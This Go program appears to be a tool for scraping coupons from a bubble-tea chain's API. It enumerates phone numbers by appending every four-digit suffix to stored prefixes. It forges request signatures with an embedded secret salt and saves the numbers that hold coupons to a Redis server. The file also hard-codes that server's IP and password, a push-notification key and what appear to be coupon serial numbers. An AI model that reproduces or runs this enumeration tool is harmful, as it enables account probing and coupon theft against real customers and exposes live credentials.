package main

import (
	"bytes"
	"crypto/sha1"
	"encoding/hex"
	"encoding/json"
	"github.com/go-redis/redis"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"strconv"
	"time"
)

type CouponLists struct {
	Data []struct {
		CouponSn      string      `json:"couponSn"`
		CouponUseTime interface{} `json:"couponUseTime"`
		CouponTitle   string      `json:"couponTitle"`
		CanGiveAway   int         `json:"canGiveAway"`
	} `json:"data"`
}

/*
ZB爆香蛋糕血糯米中杯兑换券
675928902643101
675928890373147

6759290 33577981
6759290 50169642
6759290 61034183

**/

func main() {

	db := redisUtilss()
	db.Ping()

	//var x string
	//for i := 0; i <= 10000; i++ {
	//	fmt.Scanf("%s", &x)
	//	db.SAdd("HS_PHONE_FT", x)
	//}
	//
	list, _ := db.SMembers("HS_PHONE").Result()

	for idx, pre := range list {
		for i := 1000; i <= 9999; i++ {
			t := pre + strconv.Itoa(i)
			res := getConponLists(t).Data
			log.Println(idx, t, res)
			if len(res) > 0 {
				db.SAdd("奶茶来啦", t+"-"+strconv.Itoa(len(res)))
			}
		}
	}

	http.Get("https://api2.pushdeer.com/message/push?pushkey=PDU1083TBCC4lGtxaJ1TaTDyOuAiHgRAPNjahORg&text=方糖的扫完了")

}

func getSs(time string) string {
	h := sha1.New()
	io.WriteString(h, time+"245U6Watb875eCiX4Lq")
	return hex.EncodeToString(h.Sum(nil))
}

// 用手机号查券列表
func getConponLists(phone string) CouponLists {
	var cpList CouponLists
	client := &http.Client{}

	times := time.Now().UnixMilli() / 1000
	s := getSs(strconv.Itoa(int(times)))

	req, _ := http.NewRequest("POST", "https://vapi.hsayi.com/open/coupon/user-coupon-sn-list", bytes.NewReader([]byte("{\n  \"stateList\" : [\n    0,\n    5\n  ],\n  \"mobile\" : \""+phone+"\",\n  \"pageSize\" : 10,\n  \"page\" : 1\n}")))
	req.Header.Set("SIGN", s)
	req.Header.Set("NONCE", "245")
	req.Header.Set("TIMESTAMP", strconv.Itoa(int(times)))
	req.Header.Set("content-type", "application/json")

	resp, _ := client.Do(req)
	defer resp.Body.Close()
	res, _ := ioutil.ReadAll(resp.Body)
	json.Unmarshal(res, &cpList)
	return cpList
}

func redisUtilss() *redis.Client {
	rdb := redis.NewClient(&redis.Options{Addr: "175.27.243.243:6379", Password: "213879", DB: 0})
	return rdb
}
